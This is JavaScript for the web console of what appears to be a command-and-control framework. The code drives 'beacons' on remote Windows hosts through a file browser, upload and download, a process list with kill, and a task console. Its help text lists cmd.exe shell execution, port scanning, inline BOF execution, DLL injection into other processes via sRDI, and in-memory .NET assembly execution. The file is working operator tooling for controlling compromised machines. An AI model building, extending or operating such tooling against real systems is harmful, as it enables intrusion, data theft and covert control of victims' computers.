$("fb-mkdir").addEventListener("click", async () => {
    const name = prompt("Directory name");
    if (!name) return;
    const parent = fbPath();
    const res = await sendTask(`mkdir ${qarg(fbJoin(parent, name))}`, {
        silent: true,
        noPending: true,
        source: "filebrowser",
    });
    rememberFileBrowseTask(res, { kind: "reload", path: parent });
});
$("fb-upload").addEventListener("click", () => {
    const input = $("fb-local-file");
    input.value = "";
    input.click();
});

$("fb-local-file").addEventListener("change", async e => {
    const file = e.target.files?.[0];
    if (!file) return;

    const remoteName = prompt("Remote file name", file.name);
    if (!remoteName) return;

    try {
        $("fb-list").innerHTML = '<div class="fb-empty">Preparing local file...</div>';
        const parent = fbPath();
        const remotePath = fbJoin(parent, remoteName);
        const uploadSourcePath = await stageLocalBrowserFile(file);
        $("fb-list").innerHTML = '<div class="fb-empty">Waiting for beacon upload to complete...</div>';
        const res = await sendTask(`upload ${qarg(uploadSourcePath)} ${qarg(remotePath)}`, {
            silent: true,
            noPending: true,
            source: "filebrowser",
        });
        rememberFileBrowseTask(res, { kind: "upload", path: parent, remote: remotePath, name: file.name });
    } catch (err) {
        const msg = err.message || err;
        $("fb-list").innerHTML = `<div class="fb-empty">${esc(msg)}</div>`;
    }
});
$("fb-download").addEventListener("click", () => {
    const item = selectedFileItem();
    if (!item || item.type === "d") return alert("Select a file first");
    sendTask(`download ${qarg(fileBrowseRemote(item))}`);
});
$("fb-rm").addEventListener("click", () => {
    const item = selectedFileItem();
    if (!item) return alert("Select an item first");
    const remote = fileBrowseRemote(item);
    const parent = fileBrowseParentFor(item);
    if (confirm(`delete ${remote}?`)) {
        sendTask(`rm ${qarg(remote)}`, {
            silent: true,
            noPending: true,
            source: "filebrowser",
        }).then(res => rememberFileBrowseTask(res, { kind: "reload", path: parent }));
    }
});

// ══════════════════════════════════════════════════════
//  Process list
// ══════════════════════════════════════════════════════

function parsePsOutput(text) {
    return String(text || "").split(/\r?\n/).map(line => {
        if (!line.trim() || line.startsWith("PID\t")) return null;
        const cols = line.split("\t");
        if (cols.length >= 7 && /^\d+$/.test(cols[0])) {
            return {
                pid: Number(cols[0]),
                ppid: Number(cols[1]),
                arch: cols[2] || "-",
                session: cols[3] || "-",
                user: cols[4] || "-",
                name: cols[5] || "-",
                path: cols.slice(6).join("\t") || "-",
            };
        }

        const m = line.match(/^\s*(\d+)\s+(\d+)\s+(.+)$/);
        if (!m) return null;
        return { pid: Number(m[1]), ppid: Number(m[2]), arch: "-", session: "-", user: "-", name: m[3].trim(), path: "-" };
    }).filter(Boolean);
}

function filteredProcItems() {
    if (!procListFilter) return procListItems;
    const q = procListFilter.toLowerCase();
    return procListItems.filter(it => [it.name, it.user, it.path, String(it.pid)].some(v => String(v || "").toLowerCase().includes(q)));
}

function renderProcList(items) {
    if (items) procListItems = items;
    procListSelected = -1;
    const el = $("pb-list");
    const rows = filteredProcItems();
    if (rows.length === 0) {
        el.innerHTML = `<div class="fb-empty">${procListItems.length === 0 ? "No processes. Click refresh to list." : "No matching processes."}</div>`;
        return;
    }
    el.innerHTML = `
        <div class="pb-head"><span>PID</span><span>PPID</span><span>Arch</span><span>Sess</span><span>User</span><span>Name</span><span>Path</span></div>
        ${rows.map((it, i) => `
        <div class="pb-row" data-index="${i}">
            <span class="pb-pid">${it.pid}</span>
            <span class="pb-ppid">${it.ppid}</span>
            <span class="pb-arch">${esc(it.arch || "-")}</span>
            <span class="pb-session">${esc(it.session || "-")}</span>
            <span class="pb-user" title="${esc(it.user || "-")}">${esc(it.user || "-")}</span>
            <span class="pb-name" title="${esc(it.name)}">${esc(it.name)}</span>
            <span class="pb-path" title="${esc(it.path || "-")}">${esc(it.path || "-")}</span>
        </div>`).join("")}`;
    el.querySelectorAll(".pb-row").forEach(row => {
        row.addEventListener("click", () => selectProcRow(Number(row.dataset.index)));
    });
}

function selectProcRow(index) {
    procListSelected = index;
    document.querySelectorAll(".pb-row").forEach(row => {
        row.classList.toggle("selected", Number(row.dataset.index) === index);
    });
}

function selectedProcItem() {
    const rows = filteredProcItems();
    return procListSelected >= 0 ? rows[procListSelected] : null;
}

function updateStoredBeaconStateFromResult(msg) {
    const state = stateForBeacon(msg.beacon_id);

    if (state.proc?.tasks?.[msg.task_id] || msg.source === "proclist") {
        if (state.proc?.tasks) delete state.proc.tasks[msg.task_id];
        if (msg.status === "success") {
            state.proc.items = parsePsOutput(msg.result);
            state.proc.loaded = true;
            state.proc.selected = -1;
            state.proc.taskId = null;
        }
        return true;
    }

    const kind = state.file?.tasks?.[msg.task_id] || (msg.source === "filebrowser" ? "ls" : null);
    if (kind) {
        if (state.file?.tasks) delete state.file.tasks[msg.task_id];
        if (msg.status === "success") {
            if (kind === "pwd-init") {
                state.file.path = String(msg.result || ".").trim() || ".";
                sendTaskToBeacon(msg.beacon_id, `ls ${qarg(state.file.path)}`, {
                    source: "filebrowser",
                }).then(res => rememberFileBrowseTask(res, "ls"));
            } else if (kind === "drives" || kind === "drives-init") {
                state.file.driveItems = parseDrivesOutput(msg.result);
            } else if (typeof kind === "object" && (kind.kind === "upload" || kind.kind === "reload")) {
                state.file.loaded = false;
                const reloadPath = kind.path || state.file.path || ".";
                state.file.path = reloadPath;
                sendTaskToBeacon(msg.beacon_id, `ls ${qarg(reloadPath)}`, {
                    source: "filebrowser",
                }).then(res => rememberFileBrowseTask(res, "ls"));
            } else {
                state.file.listItems = parseLsOutput(msg.result);
                state.file.loaded = true;
                state.file.selected = -1;
            }
        }
        return true;
    }

    if (!state.console) state.console = { lines: [] };
    const lines = state.console.lines || [];
    for (let i = lines.length - 1; i >= 0; i--) {
        if (lines[i].cls === "pending") {
            lines.splice(i, 1);
            break;
        }
    }
    lines.push({ cls: msg.status === "success" ? "result" : "error", text: msg.result || "(no output)" });
    state.console.lines = lines.slice(-300);
    return true;
}

async function procListRefresh() {
    const requestBeacon = selectedBeacon;
    procListLoaded = true;
    $("pb-list").innerHTML = '<div class="fb-empty">Loading...</div>';
    const res = await sendTask("ps", { silent: true, noPending: true, source: "proclist" });
    if (res?.task_id) {
        const bid = res.beacon_id || requestBeacon;
        if (bid && bid !== selectedBeacon) {
            const state = stateForBeacon(bid);
            state.proc.taskId = res.task_id;
            state.proc.tasks[res.task_id] = "ps";
            state.proc.loaded = true;
        } else {
            procListTaskId = res.task_id;
            procListTasks[res.task_id] = "ps";
        }
    }
}

$("pb-refresh").addEventListener("click", procListRefresh);
$("pb-kill").addEventListener("click", () => {
    const item = selectedProcItem();
    if (!item) return alert("Select a process first");
    if (confirm(`Kill PID ${item.pid} (${item.name})?`)) {
        sendTask(`kill ${item.pid}`, {
            silent: true,
            noPending: true,
            source: "proclist",
        }).then(() => { procListRefresh(); });
    }
});
$("pb-filter").addEventListener("input", e => {
    procListFilter = e.target.value.trim();
    renderProcList(null);
});

// ══════════════════════════════════════════════════════
//  Task submission
// ══════════════════════════════════════════════════════

const KNOWN_COMMANDS = new Set([
    "ifconfig", "portscan", "download", "upload", "whoami", "setenv",
    "drives", "mkdir", "shell", "sleep", "exit", "pwd", "kill",
    "exec", "ps", "ls", "cd", "rm", "cp", "mv", "jobs", "jobkill",
    "inline-execute", "dllinject", "execute-assembly",
]);

const HELP_TEXT = `Available commands:
  help                         Show this help
  shell <cmd>                  Execute command via cmd.exe
  exec <cmd>                   Alias of shell
  pwd                          Print current working directory
  cd <path>                    Change working directory
  ls [path]                    List files
  drives                       List logical drives
  mkdir <path>                 Create directory
  rm <path>                    Remove file or empty directory
  cp <src> <dst>               Copy file
  mv <src> <dst>               Move/rename file
  download <remote>            Download remote file to ./download/random-name
  upload <local> <remote>      Upload local absolute/cwd-relative file
  whoami                       Show current user
  ps                           List processes
  kill <pid>                   Terminate process
  jobs                         List async beacon jobs
  jobkill <job_id>             Request cancellation for an async job
  ifconfig                     Show local IP addresses
  portscan <host> <ports>      TCP scan, e.g. 10.0.0.1 1-1000
  setenv <name> <value>        Set environment variable
  sleep <sec> <jitter>         Change beacon sleep/jitter
  inline-execute <path> [args] Execute a BOF (.o) inline on the beacon
  dllinject <pid> <dll_path> [export_fn] Inject DLL into remote process via sRDI
  execute-assembly <path> [args] Run .NET assembly in-memory via CLR hosting (sRDI)
  exit                         Terminate beacon`;

function printHelp() {
    addConsoleLine("result", HELP_TEXT);
}

function splitCommandLine(line) {
    const tokens = [];
    const re = /"([^"]*)"|'([^']*)'|(\S+)/g;
    let match;
    while ((match = re.exec(line)) !== null) {
        tokens.push(match[1] ?? match[2] ?? match[3]);
    }
    return tokens;
}

function rememberCommand(line) {
    if (!line) return;
    if (commandHistory[commandHistory.length - 1] !== line) {
        commandHistory.push(line);
        if (commandHistory.length > 100) commandHistory.shift();
    }
    historyIndex = commandHistory.length;
}

function setConsoleInput(value) {
    const input = $("console-input");
    input.value = value;
    requestAnimationFrame(() => input.setSelectionRange(input.value.length, input.value.length));
}

function activeBeaconId() {
    if (selectedBeacon) return selectedBeacon;
    if (!$("beacon-view").classList.contains("hidden")) {
        const bid = ($("info-id").textContent || "").trim();
        if (bid) {
            selectedBeacon = bid;
            return bid;
        }
    }
    return null;
}

$("console-input").addEventListener("keydown", (e) => {
    if (e.isComposing) return;

    if (e.key === "ArrowUp") {
        if (commandHistory.length === 0) return;
        e.preventDefault();
        if (historyIndex <= 0) {
            historyIndex = 0;
        } else if (historyIndex > commandHistory.length - 1) {
            historyIndex = commandHistory.length - 1;
        } else {
            historyIndex -= 1;
        }
        setConsoleInput(commandHistory[historyIndex]);
        return;
    }

    if (e.key === "ArrowDown") {
        if (commandHistory.length === 0) return;
        e.preventDefault();
        if (historyIndex >= commandHistory.length - 1) {
            historyIndex = commandHistory.length;
            setConsoleInput("");
        } else {
            historyIndex += 1;
            setConsoleInput(commandHistory[historyIndex]);
        }
        return;
    }

    if (e.key === "Enter") {
        e.preventDefault();
        const cmd = $("console-input").value.trim();
        if (cmd) {
            sendTask(cmd);
            $("console-input").value = "";
        }
    }
});

async function postConsoleLine(bid, cls, text) {
    if (!bid || !text) return null;
    const res = await api(`/api/beacons/${bid}/console-line`, "POST", { cls, text });
    if (!res || !res.ok) return null;
    return await res.json().catch(() => null);
}

async function postConsolePair(bid, firstCls, firstText, secondCls, secondText) {
    await postConsoleLine(bid, firstCls, firstText);
    await postConsoleLine(bid, secondCls, secondText);
    if (bid === selectedBeacon) {
        loadTaskHistory(bid);
    }
}

async function sendTaskToBeacon(bid, cmdLine, opts = {}) {
    const line = (cmdLine || "").trim();
    if (!bid || !line) return null;
    const parts = splitCommandLine(line);
    const command = parts[0];
    const args = line.slice(command.length).trim();
    if (!KNOWN_COMMANDS.has(command)) return null;
    const res = await api(`/api/beacons/${bid}/task`, "POST", {
        command,
        args,
        source: opts.source || "console",
    });
    if (!res || !res.ok) return null;
    const body = await res.json().catch(() => null);
    if (body && typeof body === "object") body.beacon_id = bid;
    return body;
}

async function sendTask(cmdLine, opts = {}) {
    const bid = activeBeaconId();
    const line = (cmdLine || "").trim();
    if (!line) return null;
    if (!bid) {
        if (!opts.silent) addConsoleLine("error", "No beacon selected");
        return null;
    }

    const parts = splitCommandLine(line);
    const command = parts[0];
    const args = line.slice(command.length).trim();
    if (!opts.silent) rememberCommand(line);

    if (command === "help") {
        if (!opts.silent) {
            await postConsolePair(bid, "cmd", line, "result", HELP_TEXT);
        } else {
            printHelp();
        }
        return null;
    }

    if (!KNOWN_COMMANDS.has(command)) {
        const errText = `Unknown command: ${command}`;
        if (!opts.silent) {
            await postConsolePair(bid, "cmd", line, "error", errText);
        }
        return null;
    }

    const res = await api(`/api/beacons/${bid}/task`, "POST", {
        command: command,
        args: args,
        source: opts.source || "console",
    });
    if (!res || !res.ok) {
        const err = res ? await res.json().catch(() => ({})) : {};
        const errText = err.detail || "Failed to queue task";
        if (!opts.silent && (opts.source || "console") === "console") {
            await postConsolePair(bid, "cmd", line, "error", errText);
        }
        return null;
    }

    const body = await res.json().catch(() => null);
    if (body && typeof body === "object") body.beacon_id = bid;
    if (!opts.silent && (opts.source || "console") === "console") {
        loadTaskHistory(bid);
    }
    return body;
}

document.querySelectorAll(".btn-cmd").forEach(btn => {
    btn.addEventListener("click", () => {
        const cmd = btn.dataset.cmd;
        if (cmd && selectedBeacon) sendTask(cmd);
    });
});

const deleteBeaconButton = $("btn-delete-beacon");
if (deleteBeaconButton) {
    deleteBeaconButton.addEventListener("click", async () => {
        if (!selectedBeacon) return;
        const bid = selectedBeacon;
        if (!confirm(`Delete beacon instance ${bid} from Web UI?`)) return;

        const res = await api(`/api/beacons/${bid}`, "DELETE");
        if (!res || !res.ok) {
            const err = res ? await res.json().catch(() => ({})) : {};
            addConsoleLine("error", err.detail || "Failed to delete beacon");
            return;
        }

        delete beaconUiState[bid];
        selectedBeacon = null;
        $("beacon-view").classList.add("hidden");
        $("empty-view").classList.remove("hidden");
        activePane = "events";
        updateWorkspace();
        refreshEvents();
        refreshBeacons();
    });
}

const killButton = $("btn-kill");
if (killButton) {
    killButton.addEventListener("click", () => {
        if (!selectedBeacon) return;
        if (confirm("Send exit command to this beacon?")) {
            sendTask("exit");
        }
    });
}

// ══════════════════════════════════════════════════════
//  WebSocket
// ══════════════════════════════════════════════════════

function connectWS() {
    if (ws) ws.close();
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = WS_BASE || `${proto}//${location.host}`;
    ws = new WebSocket(`${wsUrl}/ws?token=${encodeURIComponent(token)}`);

    ws.onopen = async () => {
        await syncServerSession();
        refreshBeacons();
        refreshEvents();
        if (selectedBeacon) {
            loadTaskHistory(selectedBeacon);
        }
    };
    ws.onmessage = (event) => {
        const msg = JSON.parse(event.data);
        handleWSMessage(msg);
    };
    ws.onclose = () => {
        setTimeout(() => { if (token) connectWS(); }, 3000);
    };
    ws.onerror = () => {};
}

function handleWSMessage(msg) {
    switch (msg.type) {
        case "beacon_register":
            refreshBeacons();
            refreshEvents();
            addEvent("info", `Beacon ${msg.beacon_id} online (${msg.hostname}@${msg.username}) ext=${msg.external_ip || "-"} int=${msg.internal_ip || msg.ip || "-"}`);
            break;
        case "beacon_delete":
            delete beaconUiState[msg.beacon_id];
            if (selectedBeacon === msg.beacon_id) {
                selectedBeacon = null;
                $("beacon-view").classList.add("hidden");
                $("empty-view").classList.remove("hidden");
                activePane = "events";
                updateWorkspace();
            }
            refreshBeacons();
            addEvent("warn", `Beacon ${msg.beacon_id} removed`);
            break;
        case "listeners_changed":
            refreshListeners();
            refreshEvents();
            break;
        case "console_changed":
            if (msg.beacon_id === selectedBeacon) {
                loadTaskHistory(msg.beacon_id);
            }
            break;
        case "task_queued":
            if (msg.source === "console" && msg.beacon_id === selectedBeacon) {
                loadTaskHistory(msg.beacon_id);
            }
            refreshBeacons();
            break;
        case "task_sent":
            if (msg.source === "console" && msg.beacon_id === selectedBeacon) {
                loadTaskHistory(msg.beacon_id);
            }
            break;
        case "task_result":
            if (msg.source === "console") {
                if (msg.beacon_id === selectedBeacon) {
                    loadTaskHistory(msg.beacon_id);
                }
                refreshBeacons();
                break;
            }
            if (msg.beacon_id !== selectedBeacon) {
                updateStoredBeaconStateFromResult(msg);
                refreshBeacons();
                break;
            }
            if (msg.beacon_id === selectedBeacon) {
                if (procListTasks[msg.task_id] || msg.source === "proclist") {
                    delete procListTasks[msg.task_id];

                    if (msg.status !== "success") {
                        $("pb-list").innerHTML = `<div class="fb-empty">${esc(msg.result || "ps failed")}</div>`;
                        refreshBeacons();
                        break;
                    }

                    procListItems = parsePsOutput(msg.result);
                    renderProcList(null);
                    procListTaskId = null;
                    refreshBeacons();
                    break;
                }

                if (fileBrowseTasks[msg.task_id] || msg.source === "filebrowser") {
                    const kind = fileBrowseTasks[msg.task_id] || "ls";
                    delete fileBrowseTasks[msg.task_id];

                    if (msg.status !== "success") {
                        const errText = msg.result || "filebrowse failed";
                        if (typeof kind === "object" && kind.kind === "upload") {
                            addConsoleLine("error", errText);
                        }
                        $("fb-list").innerHTML = `<div class="fb-empty">${esc(errText)}</div>`;
                        refreshBeacons();
                        break;
                    }

                    if (typeof kind === "object" && kind.kind === "upload") {
                        addConsoleLine("result", msg.result || "Upload completed");
                        fileBrowseReloadPath(kind.path);
                    } else if (typeof kind === "object" && kind.kind === "reload") {
                        fileBrowseReloadPath(kind.path);
                    } else if (kind === "pwd-init") {
                        const cwd = String(msg.result || ".").trim() || ".";
                        $("fb-path").value = cwd;
                        fileBrowseRefresh();
                    } else if (kind === "drives" || kind === "drives-init") {
                        fileBrowseDriveItems = parseDrivesOutput(msg.result);
                        renderFileBrowser(fileBrowseListItems);
                    } else {
                        fileBrowseListItems = parseLsOutput(msg.result);
                        renderFileBrowser(fileBrowseListItems);
                    }

                    fileBrowseTaskId = null;
                    refreshBeacons();
                    break;
                }

                const el = $("console-output");
                const pendings = el.querySelectorAll(".console-line.pending");
                if (pendings.length > 0) pendings[pendings.length - 1].remove();

                const cls = msg.status === "success" ? "result" : "error";
                addConsoleLine(cls, msg.result || "(no output)");
            }
            refreshBeacons();
            break;
    }
}

// ══════════════════════════════════════════════════════
//  Events
// ══════════════════════════════════════════════════════

async function refreshEvents() {
    const res = await api("/api/events");
    if (!res) return;
    const events = await res.json();
    const el = $("event-log");
    el.innerHTML = events.slice(0, 50).map(ev => {
        const cls = ev.level === "WARN" ? "warn" : ev.level === "ERROR" ? "error" : "";
        return `<div class="event-item ${cls}"><span class="ev-time">${fmtTime(ev.ts)}</span> <span class="ev-msg">${esc(ev.message)}</span></div>`;
    }).join("");
}

function addEvent(level, message) {
    const el = $("event-log");
    const cls = level === "warn" ? "warn" : level === "error" ? "error" : "";
    const div = document.createElement("div");
    div.className = `event-item ${cls}`;
    div.innerHTML = `<span class="ev-time">${fmtTime(Date.now() / 1000)}</span> <span class="ev-msg">${esc(message)}</span>`;
    el.insertBefore(div, el.firstChild);
    while (el.children.length > 50) el.removeChild(el.lastChild);
}

// ══════════════════════════════════════════════════════
//  Init
// ══════════════════════════════════════════════════════

if (token) {
    showMain();
}
filebrowser
